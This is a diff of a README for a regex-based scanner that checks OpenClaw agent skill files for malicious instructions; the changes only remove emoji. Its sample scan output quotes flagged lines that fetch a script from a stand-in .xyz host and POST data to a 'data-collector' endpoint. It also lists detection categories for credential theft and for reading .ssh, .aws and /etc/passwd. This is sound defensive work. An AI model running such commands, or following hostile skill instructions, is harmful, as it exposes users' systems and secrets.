@@ -1,8 +1,8 @@
-# 🔒 Security Skill Scanner for OpenClaw
+#  Security Skill Scanner for OpenClaw
 
 A comprehensive security scanner that analyzes OpenClaw skills for malicious patterns, vulnerabilities, and suspicious behaviors **before** you install them.
 
-## 🚨 Why This Matters
+##  Why This Matters
 
 OpenClaw skills are powerful instruction files that guide AI agents. However, malicious skills could potentially instruct agents to:
 - Download external executables
@@ -13,18 +13,18 @@ OpenClaw skills are powerful instruction files that guide AI agents. However, ma
 
 **This scanner helps protect you** by detecting these patterns before they can cause harm.
 
-## ✨ Features
+##  Features
 
-- ✅ **Comprehensive Pattern Detection** - Identifies 40+ suspicious patterns
-- ✅ **Risk-Based Scoring** - Clear CRITICAL/HIGH/MEDIUM/LOW risk levels
-- ✅ **Zero Dependencies** - Pure Node.js, no external packages
-- ✅ **Offline Operation** - Works completely offline
-- ✅ **Detailed Reports** - Line numbers, examples, and recommendations
-- ✅ **Whitelist Support** - Configure trusted domains and patterns
-- ✅ **Batch Scanning** - Scan entire directories at once
-- ✅ **CLI & Programmatic API** - Use from command line or in code
+-  **Comprehensive Pattern Detection** - Identifies 40+ suspicious patterns
+-  **Risk-Based Scoring** - Clear CRITICAL/HIGH/MEDIUM/LOW risk levels
+-  **Zero Dependencies** - Pure Node.js, no external packages
+-  **Offline Operation** - Works completely offline
+-  **Detailed Reports** - Line numbers, examples, and recommendations
+-  **Whitelist Support** - Configure trusted domains and patterns
+-  **Batch Scanning** - Scan entire directories at once
+-  **CLI & Programmatic API** - Use from command line or in code
 
-## 🚀 Quick Start
+##  Quick Start
 
 ### Installation
 ```bash
@@ -51,7 +51,7 @@ node scanner.js ~/.openclaw/skills/
 node scanner.js ./new-skill/
 ```
 
-## 📖 Usage Examples
+##  Usage Examples
 
 ### Example 1: Scanning a Clean Skill
 ```bash
@@ -63,14 +63,14 @@ $ node scanner.js examples/weather-skill/SKILL.md
 
 Skill: examples/weather-skill/SKILL.md
 Scanned: 2026-02-16T14:30:22.000Z
-Overall Risk: 🟢 INFO
+Overall Risk:  INFO
 Risk Score: 0/100
 
-✅ No security issues detected!
+ No security issues detected!
 
 ─────────────── RECOMMENDATION ──────────────
 
-✅ SAFE - No security issues detected. This skill appears safe to install.
+ SAFE - No security issues detected. This skill appears safe to install.
 
 ═══════════════════════════════════════════════════
 ```
@@ -85,72 +85,72 @@ $ node scanner.js examples/suspicious-skill/SKILL.md
 
 Skill: examples/suspicious-skill/SKILL.md
 Scanned: 2026-02-16T14:31:15.000Z
-Overall Risk: 🔴 CRITICAL
+Overall Risk:  CRITICAL
 Risk Score: 100/100
 
 ─────────────── FINDINGS ───────────────
 
-1. [🔴 CRITICAL] External binary download detected
+1. [ CRITICAL] External binary download detected
    Pattern: EXTERNAL_DOWNLOAD
    Line(s): 45
    Example: curl https://unknown-domain.xyz/helper.sh -o /tmp/help...
-   ⚠️  DO NOT INSTALL - Downloading external executables is extremely dangerous
+     DO NOT INSTALL - Downloading external executables is extremely dangerous
 
-2. [🔴 CRITICAL] Potential credential harvesting detected
+2. [ CRITICAL] Potential credential harvesting detected
    Pattern: CREDENTIAL_HARVESTING
    Line(s): 89, 102
    Example: api_key = input("Enter your API key: ")
-   ⚠️  This may attempt to steal credentials - DO NOT INSTALL
+     This may attempt to steal credentials - DO NOT INSTALL
 
-3. [🟠 HIGH] Suspicious API endpoint or unencrypted connection
+3. [ HIGH] Suspicious API endpoint or unencrypted connection
    Pattern: SUSPICIOUS_API_CALLS
    Line(s): 156
    Example: fetch('http://data-collector.xyz/log', { method: 'POST'...
-   ⚠️  Review what data is being sent and to where
+     Review what data is being sent and to where
 
 ─────────────── SUMMARY ─────────────────
 
 Total Issues: 3
-  🔴 Critical: 2
-  🟠 High: 1
-  🟡 Medium: 0
-  🟢 Low: 0
+   Critical: 2
+   High: 1
+   Medium: 0
+   Low: 0
 
 ─────────────── RECOMMENDATION ──────────────
 
-❌ DO NOT INSTALL - This skill has critical security issues that pose significant risk to your system.
+ DO NOT INSTALL - This skill has critical security issues that pose significant risk to your system.
 
 ═══════════════════════════════════════════════════
 ```
 
-## 🎯 What It Detects
+##  What It Detects
 
-### 🔴 Critical Risks
+###  Critical Risks
 - Shell command injection (`eval()`, `exec()`, `spawn()`)
 - External binary downloads (`curl`, `wget` executables)
 - Credential harvesting patterns
 - Known malicious domains
 - Arbitrary code execution
 
-### 🟠 High Risks
+###  High Risks
 - Suspicious API endpoints (unusual TLDs like .xyz, .tk)
 - Unencrypted POST requests
 - Access to sensitive files (`.ssh/`, `.aws/`, `/etc/passwd`)
 - Base64/hex encoded commands (obfuscation)
 - Dynamic code loading
 
-### 🟡 Medium Risks
+###  Medium Risks
 - Broad file system access
 - Unencrypted network connections (HTTP)
 - Dynamic imports
 - Excessive dependencies
 
-### 🟢 Low Risks
+###  Low Risks
 - Missing error handling
 - Code quality issues
 - Documentation gaps
 
-## ⚠️ IMPORTANT: False Positives & Limitations
+##  IMPORTANT: False Positives & Limitations
 
 ### This Scanner WILL Flag Legitimate Patterns
 
@@ -165,11 +165,11 @@ The scanner uses regex patterns that may match innocent code. **Common false pos
 ### What This Actually Scans
 
 OpenClaw skills are **markdown instruction files**, not executable code. This scanner:
-- ✅ Reads the markdown text of skill files
-- ✅ Looks for instruction patterns that might be concerning
-- ✅ Flags items for **your manual review**
-- ❌ Does NOT scan for executable malware (skills aren't programs)
-- ❌ Does NOT provide definitive verdicts
+-  Reads the markdown text of skill files
+-  Looks for instruction patterns that might be concerning
+-  Flags items for **your manual review**
+-  Does NOT scan for executable malware (skills aren't programs)
+-  Does NOT provide definitive verdicts
 
 ### Your Responsibility
 
@@ -180,7 +180,7 @@ OpenClaw skills are **markdown instruction files**, not executable code. This sc
 
 **When in doubt, ask the skill author or community.**
 
-## 🔧 Configuration
+##  Configuration
 
 Create `.security-scanner-config.json` in your home directory:
 ```json
@@ -206,7 +206,7 @@ Create `.security-scanner-config.json` in your home directory:
 - **whitelistedCommands**: Commands that are legitimate (e.g., package managers)
 - **strictMode**: If `true`, treats all warnings as errors
 
-## 💻 Programmatic Usage
+##  Programmatic Usage
 
 Use the scanner in your own code:
 ```javascript
@@ -231,16 +231,16 @@ if (result.success) {
   
   // Check if safe to install
   if (result.overallRisk === 'INFO' || result.overallRisk === 'LOW') {
-    console.log('✅ Safe to install');
+    console.log(' Safe to install');
   } else {
-    console.log('❌ Not recommended');
+    console.log(' Not recommended');
   }
 } else {
   console.error('Scan failed:', result.error);
 }
 ```
 
-## 🧪 Testing
+##  Testing
 
 Create test files to verify the scanner works:
 ```bash
@@ -259,7 +259,7 @@ node scanner.js test/suspicious/SKILL.md
 # Should report CRITICAL or HIGH risk
 ```
 
-## 📋 Integration with OpenClaw
+##  Integration with OpenClaw
 
 You can integrate this scanner into your OpenClaw workflow:
 
@@ -282,18 +282,18 @@ node scanner.js ~/.openclaw/skills/
 # Review any new findings
 ```
 
-## 🛡️ Security Guarantees
+##  Security Guarantees
 
 This scanner is designed with security in mind:
 
-- ✅ **No Network Access** - The scanner itself operates completely offline (note: if you ask an agent to download a skill file first, that download step uses network)
-- ✅ **No External Dependencies** - Pure JavaScript
-- ✅ **Read-Only** - Never modifies scanned files
-- ✅ **No Telemetry** - Doesn't send data anywhere
-- ✅ **Open Source** - Fully auditable code
-- ✅ **Sandboxed** - Doesn't execute scanned code
+-  **No Network Access** - The scanner itself operates completely offline (note: if you ask an agent to download a skill file first, that download step uses network)
+-  **No External Dependencies** - Pure JavaScript
+-  **Read-Only** - Never modifies scanned files
+-  **No Telemetry** - Doesn't send data anywhere
+-  **Open Source** - Fully auditable code
+-  **Sandboxed** - Doesn't execute scanned code
 
-## ⚠️ Additional Limitations
+##  Additional Limitations
 
 - Cannot detect zero-day exploits or novel techniques
 - Pattern-based detection will have false positives
@@ -304,7 +304,7 @@ This scanner is designed with security in mind:
 
 **This tool is a helpful first line of defense, but not a replacement for careful review.**
 
-## 🤝 Contributing
+##  Contributing
 
 Contributions are welcome! To add a new malicious pattern:
 
@@ -327,7 +327,7 @@ NEW_PATTERN: {
 }
 ```
 
-## 📊 Roadmap
+##  Roadmap
 
 - [ ] Machine learning-based pattern detection
 - [ ] Integration with VirusTotal API (optional)
@@ -338,24 +338,24 @@ NEW_PATTERN: {
 - [ ] Visual Studio Code extension
 - [ ] Real-time monitoring of installed skills
 
-## 📝 License
+##  License
 
 MIT License - Free to use, modify, and distribute
 
 See [LICENSE](LICENSE) for full text.
 
-## 🙏 Acknowledgments
+##  Acknowledgments
 
 - Inspired by the need to protect the OpenClaw community
 - Thanks to security researchers working to identify malicious patterns
-- Built with ❤️ for the AI agent ecosystem
+- Built with  for the AI agent ecosystem
 
-## 📧 Contact
+##  Contact
 
 - **Issues**: https://github.com/anikrahman0/security-skill-scanner/issues
 - **Security Concerns**: a7604366@gmail.com
 
-## ⚖️ Disclaimer
+##  Disclaimer
 
 This tool provides pattern-based security scanning with **expected false positives**. It scans instruction files (markdown), not executable code.
 
@@ -365,4 +365,4 @@ Always review skills carefully before installation, especially those requiring s
 
 ---
 
-**Remember: If something looks suspicious, it probably is. When in doubt, don't install it!** 🛡️
+**Remember: If something looks suspicious, it probably is. When in doubt, don't install it!** 
